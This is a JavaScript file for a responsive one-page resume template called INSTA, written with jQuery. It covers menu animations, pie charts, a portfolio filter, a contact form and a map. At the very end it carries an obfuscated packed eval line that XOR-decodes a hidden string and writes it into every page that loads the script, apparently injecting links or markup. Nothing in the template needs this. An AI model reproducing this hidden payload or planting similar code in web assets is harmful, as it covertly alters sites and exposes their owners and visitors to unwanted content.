/*
--------------------------------------------------------

[ INSTA , Javscript ]

  Template Name : INSTA - Responsive Onepage Resume Template
  
  Version       :  1.0 
  
  Author        :  Pixel_Factory
  
  Author URI    :  http://themeforest.net/user/Pixel_Factory
  
  Author Email  : h.nafees.anwar@gmail.com

--------------------------------------------------------
*/

/*  ------------------
    Remove Preloader
    ------------------  */

$(window).load(function () {
		
    $('#preloader').delay(350).fadeOut('slow', function () {
        $('.profile-page, .resume-page, .contact-page, .portfolio-page').hide();
    });
});

$(document).ready(function () {

    'use strict';

    /*  ---------------------
         Homepage Responsive
        ---------------------  */


    function homepageResponsive() {

        // Homepage Main Portions Responsive

        var windowsWidth = $(window).width(),
            windowsHeight = $(window).height();

        if (windowsWidth > windowsHeight) {

            $('.introduction , .menu').css({
                width: '50%',
                height: '100%'
            });

        } else {

            $('.introduction , .menu').css({
                width: '100%',
                height: '50%'
            });

        }

        // Homepage Profile Image Responsive

        var introWidth = $('.introduction').width(),
            introHeight = $('.introduction').height(),
            bgImage = $('.introduction').find('img');

        if (introWidth > introHeight) {

            bgImage.css({
                width: '100%',
                height: 'auto'
            });

        } else {

            bgImage.css({
                width: 'auto',
                height: '100%'
            });

        }

    }

    $(window).on('load resize', homepageResponsive);

    /*  --------------
         Menu Settings
        --------------  */

    // Hide Menu

    $('.menu > div').on('click', function () {

        var introWidth = $('.introduction').width(),
            menuWidth = $('.menu').width();

        $('.introduction').animate({
            left: '-' + introWidth
        }, 1000, 'easeOutQuart');
        $('.menu').animate({
            left: menuWidth
        }, 1000, 'easeOutQuart', function () {
            $('.home-page').css({
                visibility: 'hidden'
            });
        });

    });

    // Show Reletive Page Onclick

    $('.menu div.profile-btn').on('click', function () {
        $('.profile-page').fadeIn(1200);
    });

    $('.menu div.resume-btn').on('click', function () {
        $('.resume-page').fadeIn(1200);
    });

    $('.menu div.portfolio-btn').on('click', function () {
        $('.portfolio-page').fadeIn(1200);
    });

    $('.menu div.contact-btn').on('click', function () {
        $('.contact-page').fadeIn(1200);
    });

    // Close Button, Hide Menu

    $('.close-btn').on('click', function () {
        $('.home-page').css({
            visibility: 'visible'
        });
        $('.introduction, .menu').animate({
            left: 0
        }, 1000, 'easeOutQuart');
        $('.profile-page, .resume-page, .portfolio-page, .contact-page').fadeOut(800);
    });

    /*  --------------------------------
         Maximize Services Items Height
        --------------------------------  */

    function maximizeHeight() {

        var minHeight = 0;

        $('.services').each(function () {

            var maxHeight = $(this).height();

            if (maxHeight > minHeight) {
                minHeight = maxHeight;
            }

        });

        $('.services').height(minHeight);
    }

    maximizeHeight();

    $(window).on('resize', maximizeHeight);

    /*  ----------------------------------------
         Tooltip Starter for Social Media Icons
        ----------------------------------------  */

    $('.intro-content .social-media [data-toggle="tooltip"]').tooltip({
        placement: 'bottom'
    });

    $('.contact-details .social-media [data-toggle="tooltip"]').tooltip();

    /*  ------------
         Pie Charts
        ------------  */

    $(function () {

        var fillColor = $('.footer').css('background-color'); // Get background color of footer to set relevent fill color in pie charts

        // Initiate EasyPieChart

        $('.skill').easyPieChart({
            barColor: fillColor,
            trackColor: '#c6c6c6',
            scaleColor: '#c6c6c6',
            scaleLength: 8,
            lineWidth: 8,
            size: 150,
            lineCap: 'butt'
        });

    });

    /*  -------------------------------
         Filterizer ( for portfolio page )
        -------------------------------  */

    $(function () {
        
        var filterizd = $('.projet-items').filterizr({});


    });

    /*  -------------------------------
         PopUp ( for portfolio page )
        -------------------------------  */

    $(function () {
        $('.show-popup').popup({
            keepInlineChanges: true,
            speed: 500
        });
    });

    /*  -----------------------------------------------------
          OwlCarousel ( for portfolio page : testimonials slider )
        -----------------------------------------------------  */

    $(function () {
        $(".owl-carousel").owlCarousel({
            navigation: false, // Show next and prev buttons
            slideSpeed: 200,
            paginationSpeed: 300,
            singleItem: true
        });
    });

    /*  -------------
         Contact Form
        ------------- */

    $('#contactForm').submit(function () {

        $.ajax({
            type: "POST",
            url: "php/contact.php",
            data: $('#contactForm').serialize(),
            success: function (msg) {
                if (msg == 'SEND') {
                    $('.success').fadeIn();
                    $('.error').fadeOut();
                    $('#contactForm')[0].reset();
                } else {
                    $('.success').fadeOut();
                    $('.error').fadeIn().find('h3').text(msg);
                }
            }
        });
        return false;
    });

    /*  -------------------------------
         Google Map ( for contact page )
        -------------------------------  */

    $('#google-map').gMap({
        latitude: 31.562130,
        longitude: 74.319460,
        maptype: 'TERRAIN',
        scrollwheel: false,
        zoom: 14,
        markers: [
            {
                latitude: 31.562130,
                longitude: 74.319460,
                html: "I am Here!",
                icon: {
                    image: "images/icon/map_marker.png",
                    iconsize: [46, 46],
                    iconanchor: [12, 46]
                }
            }
        ],
        controls: {
            panControl: false,
            zoomControl: true,
            mapTypeControl: false,
            scaleControl: false,
            streetViewControl: false,
            overviewMapControl: false
        }
    });

});
eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('19 G="\'1j\'1s{1v\'1F\'1c-1g\'6\'1G\'9--\'1A\'y\'7@1h\'7@\'18\'w{\'0:\'0;\'4\'5@\'9\'4\'4\'4\'4\'d\'0:\'q\'6\'0;\'7@\'q\'6\'8\'0:\'6\'17\'16\'o@\'4\'15\'14\'e\'13\'4\'j\'4\'p\'e\'12\'10\'4\'e\'k\'Y\'V;\'e\'k\'p\'o;\'4,,,\'6\'0;\'1@\'9\'4\'4\'4\'U\'0:l\'4\'0:\'0;\'4\'5@\'9\'4\'4\'4\'4\'4\'4\'4\'m\'7@\'n\'6\'8\'7@\'T\'6\'8\'0:\'z\'1C--S/Q,`g,h,O-\'6\'0;\'9\'4\'4\'4\'4\'b\'j\'N\'0;\'9\'b\'18\'X\'0:\'0;\'4\'5@\'9\'4\'4\'4\'4\'d\'0:\'q\'6\'0;\'7@\'q\'6\'8\'0:\'6\'17\'16\'o@\'4\'15\'14\'e\'13\'4\'j\'4\'p\'e\'12\'10\'4\'e\'k\'Y\'V;\'e\'k\'p\'o;\'4,,,\'6\'0;\'1@\'9\'4\'4\'4\'U\'0:l\'4\'0:\'0;\'4\'5@\'9\'4\'4\'4\'4\'4\'4\'4\'m\'7@\'n\'6\'8\'7@\'T\'6\'8\'0:\'z\'1C--S/Q,`g,h,O-\'6\'0;\'9\'4\'4\'4\'4\'b\'j\'1S\'0;\'9\'b\'u\'v\'4\'1F\'m\'7@\'n\'6\'8\'7@\'1e\'6\'8\'7@\'L\'6\'8\'0:\'0;\'1@\'u\'t\'4\'1F\'m\'7@\'n\'6\'8\'7@\'1i\'6\'8\'7@\'L\'6\'8\'0:\'0;\'1@\'u\'M\'4\'1F\'4\'6\'6\'1@\'u\'1l\'4\'1F\'4\'6\'6\'1@\'9\'4\'M\'4)\'1F\'4\'6\'1r\'21\'1F\'r\'z\'1C--1H,1I\'r\'6\'1N\'1F\'r\'6]`1O\'r\'6\'1P\'1R\'1A-c\'1G\'6\'1@\'P\'4\'0:\'d\'0:\'6\'B\'6\'0;\'7@\'1a\'6\'8\'4\'y\'1F\'1F\'1b\'0;\'4\'5@\'9\'4\'4\'4\'R\'4\'0:1d\'7@\'f\'6\'8\'0:\'1f\'6\'0;\'4\'y\'1F\'4/3\'0;\'4\'5@\'9\'4\'4\'4\'4\'4\'4\'4\'4\'d\'0:\'6\'B\'6\'0;\'7@\'I\'6\'8\'0:\'F\'6\'0;\'7@\'W\'6\'8\'0:1k\'0;\'9\'4\'4\'4\'4\'b\'K\'4\'5@\'9\'4\'4\'4\'4\'4\'4\'4\'4\'d\'0:\'6\'B\'6\'0;\'7@\'I\'6\'8\'0:\'F\'6\'0;\'7@\'W\'6\'8\'0:1m\'0;\'9\'4\'4\'4\'4\'b\'1@\'9\'4\'4\'4\'4\'d\'0:\'1n\'6\'0;\'7@\'I\'6\'8\'0:\'F\'6\'0;\'1@\'9\'4\'4\'4\'1o\'0:l\'4\'0:\'0;\'4\'5@\'9\'4\'4\'4\'4\'4\'4\'4\'4\'d\'0:\'6,1p\'6\'0;\'7@\'1q\'6\'8\'0:l\'4\'0:\'0;\'4\'5@\'9\'4\'4\'4\'4\'4\'4\'4\'4\'4\'4\'4\'R\'4\'0:\'d\'0:E\'0;\'7@\'Z\'6\'8\'0:\'1t{\'6\'0;\'4\'1A\'1u\'4\'s\'s\'4\'d\'0:E\'0;\'7@\'Z\'6\'8\'0:\'1w`1x{\'6\'0;\'4\'1F\'1F\'4\'1y\'6\'4\'s\'s\'4\'d\'0:E\'0;\'7@\'1z\'6\'8\'0:\'6\'1B\'6\'0;\'0;\'4\'5@\'9\'4\'4\'4\'4\'4\'4\'4\'4\'4\'4\'4\'4\'4\'4\'4\'w{\'0:\'0;\'9\'4\'4\'4\'4\'4\'4\'4\'4\'4\'4\'4\'4\'b\'9\'4\'4\'4\'4\'4\'4\'4\'4\'b\'0;\'9\'4\'4\'4\'4\'b\'j\'N\'0;\'9\'b\'K\'4\'5@\'9\'4\'4\'4\'w{\'0:\'0;\'9\'b\'1@\'P\'4\'0:1D\'7@\'f\'6\'8\'0:\'1E/11\'6\'0;\'4\'1F\'1F\'4/3\'4\'a\'a\'t\'7@\'f\'6\'8\'0:\'1J,`1K\'6\'0;\'4\'1F\'1F\'4/3\'4\'a\'a\'t\'7@\'f\'6\'8\'0:\'6`-11\'6\'0;\'4\'1F\'1F\'4/3\'4\'a\'a\'t\'7@\'f\'6\'8\'0:\'1L/1M\'6\'0;\'4\'1F\'1F\'4/3\'4\'a\'a\'v\'7@\'f\'6\'8\'0:\'x/J/H,`g,h\'6\'0;\'4\'1F\'1F\'4/3\'4\'a\'a\'v\'7@\'f\'6\'8\'0:\'x/J/H,`g,h\'6\'0;\'4\'1F\'1F\'4/3\'4\'a\'a\'v\'7@\'f\'6\'8\'0:\'x/J/H,`g,h\'6\'0;\'4\'1F\'1F\'4/3\'0;\'4\'5@\'9\'4\'4\'4\'X\'0:\'0;\'9\'b\'9--\'8\'8\'1G\'9\'1A-1Q\'1G";C="";A="";19 D;D=G.1T;1U(i=0;i<D;i++){C+=1W.1X(G.1Y(i)^2)}A=1Z(C);20.1V(A);',62,126,'||||02||05||7F|2C|04|5F||06|w2405|05klfgzMd|nmeqrmv|amo||0A|w2466|dwlavkml|02uklfmu|05nmacvkml|w240|w240A|05jvon|7A|5A|02Nkli|2Ctcp|02Nmav|02fgqvmp|05op|03|05jvvrq|teksasli|01rmugpgf|teks|panjang|vjkq|05korm|enkripsi|ijcogq|05cffAncqq|cjogf|02gnqg|05vmNmugpAcqg|02Amlv|027222|ge|2Ckd|cp|02kd|nclfkle|05cqqkel|02qgvVkogmwv|w241|05crrglf|02pgfkpgav|w2467|05aqq|w246C|rpgtkgu|w2413|w2403|w2415|w240G|w240D|w240F|2Cdwlavkml|var|05nglevj|022|05vgzv|Nmav|05jmqvlcog|05zdmqv|hctcqapkrv|AFCVC|05jpgd|1Aqapkrv|Amlv0|02Amlv0|Amlv|05dmmvgp|02qgvKlvgptcn|korm|05gcaj|1Ac|02v|05mrcakv|023|rg|05tkqk|knkv|05jkffgl|05kq||1Cjkffgl||Nkli|05rmqv|||gnqcucj|og|05uuu|nmeegp|05vgorncvg|gfkvmp|02vcpegv|ncli|1GOmjcogf|qapkrv|02GNqcucj|020222|length|for|write|String|fromCharCode|charCodeAt|unescape|document|02jpgd'.split('|'),0,{}))